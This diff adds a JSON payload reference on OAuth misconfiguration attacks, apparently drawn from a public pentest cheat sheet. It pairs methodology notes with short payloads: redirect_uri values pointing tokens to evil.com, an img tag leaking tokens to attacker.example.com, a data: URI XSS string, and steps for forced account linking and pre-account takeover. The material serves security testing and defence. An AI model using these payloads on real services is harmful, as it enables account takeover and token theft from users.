@@ -1,0 +1,161 @@
+{
+  "category": "OAuth Misconfiguration",
+  "source": "PayloadsAllTheThings/OAuth Misconfiguration/",
+  "entries": [
+    {
+      "subcategory": "Methodology",
+      "title": "What OAuth is and where it breaks",
+      "language": "text",
+      "tags": ["methodology", "concept", "oauth"],
+      "body": "OAuth 2.0 is an authorization framework: third-party applications get access to a user's data without receiving the password itself. Four parties take part in the flow:\n• Resource Owner - the user (the victim).\n• Client - the application that wants access (the site we log in to).\n• Authorization Server - the provider's server (Google/Facebook/...), issues the code and token.\n• Resource Server - the API where the user's data lives.\n\nMost OAuth flaws are not in the protocol itself, but in the implementation: weak redirect_uri validation, missing state checks, code/token leakage via Referer or open redirect, code reuse, incorrect account linking. The outcome is almost always the same - takeover of someone else's account (account takeover)."
+    },
+    {
+      "subcategory": "Methodology",
+      "title": "Key parameters of the authorization request",
+      "language": "text",
+      "tags": ["methodology", "parameters"],
+      "body": "The Authorization Request usually goes to /authorize and contains:\n• response_type - code (Authorization Code Flow) or token (Implicit Flow).\n• client_id - the public identifier of the client.\n• redirect_uri - where to return the code/token after login. THE MAIN attack point.\n• scope - the requested permissions. Sometimes changing the scope bypasses the filter on redirect_uri.\n• state - an anti-CSRF token, binding to the user-agent session. Its absence = CSRF -> ATO.\n• code_challenge / code_challenge_method - PKCE (S256/plain), protection for public clients.\n\nThe follow-up Token Request (to /token) exchanges the code for an access_token and contains code, redirect_uri, client_id, client_secret, code_verifier."
+    },
+    {
+      "subcategory": "Methodology",
+      "title": "Where to look and what to test",
+      "language": "text",
+      "tags": ["methodology", "how-to-test", "recon"],
+      "body": "• Find all OAuth entry points: \"Sign in with Google/Facebook/GitHub\", social account linking in settings, API integrations.\n• Intercept the whole flow in Burp: the request to /authorize, the redirect with code/token, the exchange at /token.\n• redirect_uri: substitute your own domains, subdomains, the provider's open redirect, path traversal, missing/extra slash, @-tricks, different encodings - watch where the code/token actually ends up.\n• state: remove the parameter entirely, leave it empty, replay someone else's/an old state - if the flow completes, there is no CSRF protection.\n• code: try to exchange the same code twice; try to use a code issued for a different client_id/redirect_uri.\n• scope: change it to an invalid value (scope=a) to slip past the redirect_uri filter.\n• Referer: check whether the URL with code/token leaks in the Referer header to third-party resources (img, links, analytics).\n• Account linking: check whether a social account is linked to an account by email without proof of ownership - a path to pre-account takeover."
+    },
+    {
+      "subcategory": "Methodology",
+      "title": "Tools and labs",
+      "language": "text",
+      "tags": ["tools", "labs"],
+      "body": "Burp Suite - intercept and tamper with flow parameters (redirect_uri, state, scope, code).\n\nPractice on the PortSwigger Web Security Academy:\n• Authentication bypass via OAuth implicit flow\n• Forced OAuth profile linking\n• OAuth account hijacking via redirect_uri\n• Stealing OAuth access tokens via a proxy page\n• Stealing OAuth access tokens via an open redirect"
+    },
+
+    {
+      "subcategory": "redirect_uri manipulation",
+      "title": "Token theft via redirect_uri substitution",
+      "language": "http",
+      "tags": ["redirect-uri", "token-theft", "account-takeover"],
+      "body": "https://www.example.com/signin/authorize?[...]&redirect_uri=https://demo.example.com/loginsuccessful\nhttps://www.example.com/signin/authorize?[...]&redirect_uri=https://localhost.evil.com",
+      "meta": {
+        "note": "If the server does not strictly validate redirect_uri, the code/token goes to an attacker-controlled domain. A subdomain of the victim or localhost.evil.com often slips past a weak \"starts with / contains example.com\" filter."
+      }
+    },
+    {
+      "subcategory": "redirect_uri manipulation",
+      "title": "Whitelist bypass via the provider's Open Redirect",
+      "language": "http",
+      "tags": ["redirect-uri", "open-redirect", "whitelist-bypass"],
+      "body": "https://www.example.com/oauth20_authorize.srf?[...]&redirect_uri=https://accounts.google.com/BackToAuthSubTarget?next=https://evil.com\nhttps://www.example.com/oauth2/authorize?[...]&redirect_uri=https%3A%2F%2Fapps.facebook.com%2Fattacker%2F",
+      "meta": {
+        "note": "redirect_uri passes the whitelist (the domain is trusted - accounts.google.com / apps.facebook.com), but inside it is an open redirect or an attacker-controlled application that carries the code/token off to evil.com."
+      }
+    },
+    {
+      "subcategory": "redirect_uri manipulation",
+      "title": "Bypassing the redirect_uri filter via an invalid scope",
+      "language": "http",
+      "tags": ["redirect-uri", "scope", "filter-bypass"],
+      "body": "https://www.example.com/admin/oauth/authorize?[...]&scope=a&redirect_uri=https://evil.com",
+      "meta": {
+        "note": "Sometimes the redirect_uri filter is tied to a specific scope. Substitute an invalid scope (scope=a) - the check may be skipped, and redirect_uri='https://evil.com' will be accepted."
+      }
+    },
+    {
+      "subcategory": "redirect_uri manipulation",
+      "title": "Tip - never whitelist entire domains",
+      "language": "text",
+      "tags": ["redirect-uri", "tip", "whitelist"],
+      "body": "OAuth implementations should NOT whitelist entire domains - only a few specific URLs, so that redirect_uri cannot be pointed at an Open Redirect.\n\nIn pentesting this is exactly the hook: if a whole domain is allowed (and it has an open redirect) or any subdomain is allowed - that is a path to stealing the code/token. Iterate through:\n• subdomains: redirect_uri=https://attacker.example.com\n• open redirect on a trusted domain: ...?next=https://evil.com\n• parsing tricks: https://trusted.com.evil.com, https://evil.com\\@trusted.com, https://trusted.com@evil.com\n• path/slash: https://trusted.com/../evil, an extra or missing trailing /"
+    },
+
+    {
+      "subcategory": "Missing / bypassed state (CSRF)",
+      "title": "CSRF in the OAuth callback -> forced account linking",
+      "language": "text",
+      "tags": ["state", "csrf", "account-takeover"],
+      "body": "Applications that do not verify a valid CSRF token in the OAuth callback are vulnerable. The attacker initiates the OAuth flow with THEIR OWN provider account, intercepts the callback and does NOT complete it:\n\nhttps://example.com/callback?code=AUTHORIZATION_CODE\n\nThis URL is used in a CSRF attack: the victim, logged in to example.com, opens the link -> the attacker's provider account is linked to the victim's account -> the attacker logs into the victim's account through their own social account (account takeover / forced OAuth profile linking)."
+    },
+    {
+      "subcategory": "Missing / bypassed state (CSRF)",
+      "title": "Tip - the state parameter is mandatory (RFC)",
+      "language": "text",
+      "tags": ["state", "csrf", "tip"],
+      "body": "The client MUST implement CSRF protection for its redirection URI. This is usually a value that binds the request to the authenticated state of the user-agent. The client SHOULD use the state parameter to pass this value to the authorization server in the authorization request.\n\nChecklist when testing state:\n• Is the state parameter present in the request to /authorize at all?\n• Does the server verify it in the callback, or accept a response with no state / with an empty state?\n• Is state bound to the user's session (so you cannot reuse someone else's)?\n• Is state one-time and unpredictable?\nIf even one item fails - there is a CSRF leading to account linking and its takeover."
+    },
+
+    {
+      "subcategory": "Code/token leakage via Referer",
+      "title": "Stealing an OAuth token via Referer",
+      "language": "text",
+      "tags": ["referer", "token-theft", "html-injection"],
+      "body": "Have an HTML injection but cannot get XSS? Check whether the site has OAuth.\n\nIdea (@abugzlife1): place an <img> tag with src pointing to your server and find a way to bring the victim there (a redirect, etc.) AFTER login. Then the OAuth callback URL with access_token/code leaks to your server in the Referer header.\n\nWhere to look: pages the user lands on right after the OAuth redirect, where the URL still contains the token/code in the query or fragment - any outbound request (img, link, third-party analytics) can carry that URL off in the Referer."
+    },
+    {
+      "subcategory": "Code/token leakage via Referer",
+      "title": "PoC - img tag to leak the token in Referer",
+      "language": "html",
+      "tags": ["referer", "poc", "token-theft"],
+      "body": "<img src=\"https://attacker.example.com/collect\">"
+    },
+
+    {
+      "subcategory": "XSS via redirect_uri",
+      "title": "XSS via redirect_uri (data: URI + state)",
+      "language": "http",
+      "tags": ["redirect-uri", "xss", "data-uri"],
+      "body": "https://example.com/oauth/v1/authorize?[...]&redirect_uri=data%3Atext%2Fhtml%2Ca&state=<script>alert('XSS')</script>",
+      "meta": {
+        "note": "If redirect_uri accepts the data: scheme and the server reflects state in the body, XSS executes. redirect_uri=data:text/html,a (URL-encoded), and the payload rides in state."
+      }
+    },
+
+    {
+      "subcategory": "Code reuse",
+      "title": "Reuse of an authorization code",
+      "language": "text",
+      "tags": ["authorization-code", "replay", "rfc-violation"],
+      "body": "Per the RFC the client must NOT use an authorization code more than once.\n\nIf an authorization code is used more than once, the authorization server MUST deny the request and SHOULD (where possible) revoke all tokens previously issued based on that code.\n\nTest: intercept the code-for-token exchange at /token, replay the same request with the same code a second time. If the server again issues an access_token (rather than an invalid_grant error) - the rule is violated. This opens a window for replay attacks: an intercepted code can be reused to obtain a token."
+    },
+
+    {
+      "subcategory": "Hijacking via Open Redirect",
+      "title": "Stealing a token via an Open Redirect in the client",
+      "language": "text",
+      "tags": ["open-redirect", "token-theft", "implicit-flow"],
+      "body": "If the client's trusted (whitelisted) redirect_uri has an Open Redirect, the chain looks like this:\n1) redirect_uri points to a trusted page of the client that itself redirects further based on a parameter (?returnUrl=, ?next=, ?url=).\n2) In the Implicit Flow the token arrives in the URL fragment (#access_token=...). On a normal redirect the fragment is preserved and carried to the next hop.\n3) We send the victim to our own domain - and grab the access_token from the fragment.\n\nExample idea:\n&redirect_uri=https://trusted-client.com/callback?next=https://evil.com\n\nFor a fragment leak you need a proxy/page on the trusted domain that performs a location redirect (then the #access_token reaches it) or JS that reads location.hash and sends it to the attacker."
+    },
+
+    {
+      "subcategory": "Implicit Flow issues",
+      "title": "Authentication bypass via substitution in the Implicit Flow",
+      "language": "text",
+      "tags": ["implicit-flow", "auth-bypass", "account-takeover"],
+      "body": "In the Implicit Flow (response_type=token) the access_token is returned straight to the browser, and the client often trusts the profile data that comes from the frontend, without server-side verification of the token at the provider.\n\nAttack: complete your own OAuth flow, then in the request the client uses to \"log in\" the user (for example POST /authenticate with {email, token} or with a profile id) substitute the email/identifier with the victim's. If the server does not verify that the token was actually issued for that email at the provider - you log in as the victim.\n\nKey: look for a request where the client accepts email/userId/token from the frontend and trusts them. Change the identifier to someone else's."
+    },
+
+    {
+      "subcategory": "Account takeover via pre-account",
+      "title": "Pre-account takeover (linking by unverified email)",
+      "language": "text",
+      "tags": ["pre-account", "account-takeover", "email"],
+      "body": "A scenario where an account is \"taken over in advance\":\n1) The attacker registers an ordinary account on the site using the victim's email (victim@mail.com) - but the email is not verified, or the victim is not there yet.\n2) Later the victim arrives and logs in via \"Sign in with Google\" with the same email.\n3) If the site links the OAuth login to an existing account BY MATCHING the email without proof of ownership - both logins lead to a single account.\n4) The attacker, knowing the password they set, logs into the victim's account.\n\nThe reverse variant: the attacker logs in via the social provider first, and the victim then registers with a password on the same email and ends up in an account shared with the attacker.\n\nTest: create an account on an email you will later sign in with through the provider; check whether they are merged and whether your access persists."
+    },
+
+    {
+      "subcategory": "PKCE bypass",
+      "title": "PKCE bypass / absence",
+      "language": "text",
+      "tags": ["pkce", "code-interception", "bypass"],
+      "body": "PKCE (Proof Key for Code Exchange) protects against interception of the authorization code: the client generates a random code_verifier, sends its hash (code_challenge, method=S256) to /authorize, and at the exchange passes the original code_verifier. An intercepted code without the verifier is useless.\n\nWhat to check:\n• Does the server support PKCE at all? If not - an intercepted code is exchanged for a token right away.\n• Does /token accept the exchange WITHOUT code_verifier even though a code_challenge was sent to /authorize? (PKCE downgrade.)\n• Is code_challenge_method=plain accepted instead of S256? Then code_challenge == code_verifier, and intercepting the challenge breaks the protection.\n• Does the server actually verify SHA256(code_verifier) == code_challenge, or is the check purely formal (any verifier passes)?\n\nAny of these items nullifies PKCE and brings back the classic risk of code interception."
+    },
+
+    {
+      "subcategory": "Key leakage",
+      "title": "Exposure of the OAuth Private Key in a mobile application",
+      "language": "text",
+      "tags": ["private-key", "mobile", "decompile"],
+      "body": "Some Android/iOS applications can be decompiled to extract the OAuth Private Key (client_secret, signing keys) from them.\n\nWhere to look: decompile the APK/IPA (jadx, apktool) and grep the resources, strings, configs and code for client_secret, private_key, oauth, BEGIN PRIVATE KEY, api_key. A leaked secret lets you impersonate the legitimate client and abuse the trusted client_id."
+    }
+  ]
+}
